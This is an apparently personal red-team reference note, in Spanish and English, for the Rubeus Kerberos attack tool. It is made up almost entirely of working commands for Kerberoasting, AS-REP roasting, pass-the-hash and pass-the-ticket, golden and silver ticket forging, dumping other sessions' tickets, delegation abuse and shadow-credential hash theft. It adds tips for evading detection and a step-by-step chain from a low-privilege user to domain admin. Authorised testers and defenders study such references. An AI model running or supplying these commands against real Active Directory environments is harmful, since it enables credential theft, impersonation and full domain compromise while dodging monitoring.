---
aliases:
  - Rubeus
tags:
  - tool/rubeus
  - technique/credential-access
  - technique/lateral-movement
  - env/windows
  - env/active-directory
  - service/kerberos
primary categories:
  - "[[Red Team]]"
secondary categories:
  - "[[Credential Access]]"
tertiary categories:
  - "[[Kerberos]]"
linked:
  - "[[Kerberoasting]]"
  - "[[AS-REP Roasting]]"
  - "[[Pass-the-Ticket]]"
  - "[[Golden Ticket]]"
  - "[[Silver Ticket]]"
  - "[[Shadow Credentials]]"
  - "[[AD CS Abuse]]"
  - "[[Active Directory Explotación]]"
  - "[[Impacket Toolkit]]"
---
# Rubeus

---

## Overview

Toolkit C# para Kerberos (**GhostPack**). Counterpart Windows de impacket Kerberos tools. Ejecutable standalone (`Rubeus.exe`) o in-memory via `Invoke-Binary` (ver [[evil-winrm]]) / execute-assembly (C2).

Compilar: VS2019+ con .NET 3.5/4.x targets / repo GhostPack. Binarios precompilados comunes: `/opt/tools/Rubeus/`.

> Regla: Rubeus corre in-memory con privilegios del user actual. Para operaciones SYSTEM (`dump`, `harvest`, `monitor`): necesita elevación o `ptt` con ticket SYSTEM.

---

## Sintaxis base

```
Rubeus.exe <command> [/option:value]
Rubeus.exe <command> /user:USER /password:PASS /domain:DOMAIN
Rubeus.exe <command> /user:USER /rc4:<NThash> /domain:DOMAIN
Rubeus.exe <command> /user:USER /aes256:<aes256> /domain:DOMAIN
```

Encoding tickets: Rubeus trabaja con **kirbi (base64)**. Para ccache: convertir con `impacket-ticketConverter` o `Rubeus ptt` + `klist export`.

---

## Kerberoasting

```powershell
# Listar SPNs (sin requestear)
Rubeus.exe kerberoast /stats

# Roast todos los SPNs
Rubeus.exe kerberoast /outfile:hashes.txt
Rubeus.exe kerberoast /format:hashcat /outfile:hashes.txt

# Filtrar — user sin delegación, pwdlastset antiguo
Rubeus.exe kerberoast /nopreauth:USER /stats        # sin auth (RBCD abuse)
Rubeus.exe kerberoast /user:sqlsvc /simple

# AES si user tiene msds-supportedenctypes con AES
Rubeus.exe kerberoast /aes /outfile:hashes.txt      # hashcat -m 19700

# Opsec — evitar 4769 encryptionType=0x17 loggeable
Rubeus.exe kerberoast /tgtdeleg                     # reutiliza TGT propio
```

Ver [[Kerberoasting]] para hashcat side.

---

## AS-REP Roasting

```powershell
Rubeus.exe asreproast /format:hashcat /outfile:asrep.txt
Rubeus.exe asreproast /user:alice /domain:domain.local /format:hashcat
Rubeus.exe asreproast /nopreauth:alice                 # para user específico sin DC auth
```

Ver [[AS-REP Roasting]].

---

## Ticket management

### asktgt (TGT request)

```powershell
# Con password
Rubeus.exe asktgt /user:alice /password:Passw0rd /domain:domain.local /dc:dc01.domain.local /nowrap

# PtH / OverPtH
Rubeus.exe asktgt /user:alice /rc4:<NT> /domain:domain.local /nowrap
Rubeus.exe asktgt /user:alice /aes256:<key> /domain:domain.local /opsec

# PtT automático (cargar en sesión actual)
Rubeus.exe asktgt /user:alice /rc4:<NT> /domain:domain.local /ptt

# UnPAC-the-hash (sacar NT del user via PAC)
Rubeus.exe asktgt /user:alice /certificate:user.pfx /password:<pfxpass> /getcredentials /nowrap
```

`/opsec` evita indicadores obvios (UserAccountControl flags, etags canónicos). `/nowrap` → base64 en una línea.

### asktgs (TGS request)

```powershell
Rubeus.exe asktgs /ticket:<TGT_b64> /service:CIFS/victim.domain.local /dc:dc01.domain.local /ptt
Rubeus.exe asktgs /ticket:tgt.kirbi /service:HTTP/srv01 /enctype:AES256 /ptt
```

### renew / describe

```powershell
Rubeus.exe renew /ticket:<b64>
Rubeus.exe describe /ticket:<b64>          # parse PAC, flags, validity
Rubeus.exe describe /ticket:ticket.kirbi
```

### ptt / purge

```powershell
Rubeus.exe ptt /ticket:<b64>               # load kirbi en sesión actual
Rubeus.exe ptt /ticket:ticket.kirbi
Rubeus.exe purge                            # borrar tickets de sesión actual
Rubeus.exe purge /luid:0xDEADBEEF           # purge de otra sesión (necesita SYSTEM)
```

### klist

```powershell
Rubeus.exe klist                            # tickets sesión actual
Rubeus.exe klist /luid:0xDEADBEEF           # otra sesión (SYSTEM)
```

Ver [[Pass-the-Ticket]].

---

## Golden / Silver Ticket

### golden

```powershell
Rubeus.exe golden /user:Administrator /domain:domain.local \
  /sid:S-1-5-21-... /rc4:<krbtgt_NT> /ptt
Rubeus.exe golden /user:Administrator /domain:domain.local \
  /sid:S-1-5-21-... /aes256:<krbtgt_aes> /ptt /netbios:DOMAIN

# Cross-forest (SID History)
Rubeus.exe golden /user:Administrator /domain:a.local /sid:<A_SID> \
  /rc4:<A_krbtgt> /sids:<B_EA_SID> /ptt

# Sapphire (2022) — PAC del propio user en vez de hardcoded groups
Rubeus.exe golden /user:Administrator /domain:a.local /sid:<A_SID> \
  /rc4:<A_krbtgt> /user:Administrator /impersonateuser:someuser /ptt
```

Ver [[Golden Ticket]].

### silver

```powershell
Rubeus.exe silver /user:Administrator /domain:domain.local /sid:S-1-5-21-... \
  /rc4:<service_NT> /service:CIFS/victim /ptt
```

Ver [[Silver Ticket]].

---

## Harvest / dump / monitor (credential access activo)

### dump

Dumpea tickets de sesiones activas (necesita `SeTcbPrivilege`/SYSTEM para otras).

```powershell
Rubeus.exe dump                              # tu sesión
Rubeus.exe dump /luid:0xDEADBEEF             # sesión específica
Rubeus.exe dump /service:krbtgt /nowrap      # solo TGTs
Rubeus.exe dump /user:DA                     # filtrar por user
```

### harvest

Monitorea la sesión y extrae tickets cuando llegan.

```powershell
Rubeus.exe harvest /interval:30              # cada 30s
```

### monitor

Escucha 4624 logon events y extrae tickets (SYSTEM).

```powershell
Rubeus.exe monitor /interval:5 /filteruser:<user>
```

### tgtdeleg

Extrae TGT del user actual via **G-SS-API unconstrained delegation trick** (sin DCSync, sin dump memoria — bajo opsec).

```powershell
Rubeus.exe tgtdeleg /nowrap
Rubeus.exe tgtdeleg /target:dc01.domain.local
```

Excepto si `Protected Users` o `NOT_DELEGATED` flag.

---

## S4U (Kerberos delegation abuse)

### S4U2self + S4U2proxy (Constrained Delegation)

```powershell
Rubeus.exe s4u /user:svcaccount /rc4:<NT> /impersonateuser:Administrator \
  /msdsspn:CIFS/victim.domain.local /ptt /domain:domain.local
```

### RBCD (Resource-Based Constrained Delegation)

```powershell
# Prereq: escribir msDS-AllowedToActOnBehalfOfOtherIdentity en victim$
Rubeus.exe hash /password:Passw0rd /user:fake$ /domain:domain.local    # NT hash
Rubeus.exe s4u /user:fake$ /rc4:<fake_NT> /impersonateuser:Administrator \
  /msdsspn:CIFS/victim /ptt /domain:domain.local
```

### Self (U2U)

```powershell
Rubeus.exe s4u /user:alice /rc4:<NT> /impersonateuser:Administrator \
  /msdsspn:CIFS/victim /self /altservice:HOST,LDAP,CIFS,HTTP /ptt
```

`/altservice` agrega SPNs adicionales al TGS (Kerberos trick — `sname` no valida vs SPN real).

---

## Shadow Credentials + Kerberos cert auth (PKINIT)

Tras haber escrito `msDS-KeyCredentialLink` (ver [[Shadow Credentials]]):

```powershell
# PKINIT con PFX → TGT + NThash del user
Rubeus.exe asktgt /user:victim /certificate:victim.pfx /password:<pfxpass> \
  /domain:domain.local /getcredentials /nowrap
```

El `/getcredentials` devuelve NThash del user (vía U2U + PAC extraction).

---

## createnetonly

Crear sesión `netonly` (runas /netonly sin prompt) para inyectar TGT ajeno.

```powershell
Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe /show
# Luego en ese cmd:
Rubeus.exe ptt /ticket:<b64>
```

Útil para correr herramientas con creds AD sin cambiar user del host.

---

## changepw

Cambiar password de una cuenta vía Kerberos (MS-SAMR alternative, útil si SMB bloqueado).

```powershell
Rubeus.exe changepw /ticket:alice.kirbi /new:NewPassword123!
```

---

## tgssub (TGS field substitution — CVE-2020-17049)

```powershell
Rubeus.exe tgssub /ticket:<b64> /altservice:cifs/victim.domain.local /ptt
```

Historical bypass en non-fully-patched DCs.

---

## hash (hash computation offline)

```powershell
Rubeus.exe hash /password:Passw0rd /user:alice /domain:domain.local
# Output: NT, AES128, AES256, DES
```

Útil para convertir password → AES256 sin pegarse a DC.

---

## Opsec tips

- `/opsec` flag en `asktgt` → mimetiza flows legítimos.
- Preferir AES sobre RC4 en `kerberoast`/`asktgt` — RC4 genera Event 4769 `Ticket Encryption Type: 0x17`, signal típica de roast.
- `tgtdeleg` evita acceder a LSA memory (no lee LSASS).
- `purge` antes de `ptt` evita colisión de tickets en sesión.
- Evitar cmdline largo: usar `Invoke-Binary` con args encoded, o file-based input (`/ticketfile:`).
- Loggear con `klist` para confirmar ticket loaded antes de ejecutar acción.

---

## Chain típico: user low → DA

```
1. Rubeus kerberoast /outfile:roast.txt
2. hashcat -m 13100 roast.txt rockyou.txt
3. Rubeus asktgt /user:svc /password:<cracked> /nowrap
4. Rubeus s4u /user:svc /password:... /impersonateuser:Administrator /msdsspn:CIFS/dc01 /ptt
5. dir \\dc01\C$
```

---

## Referencias

- Repo: https://github.com/GhostPack/Rubeus
- Harmj0y writeups: https://posts.specterops.io/tagged/active-directory
- `Rubeus.exe <command> /?` para help per-command
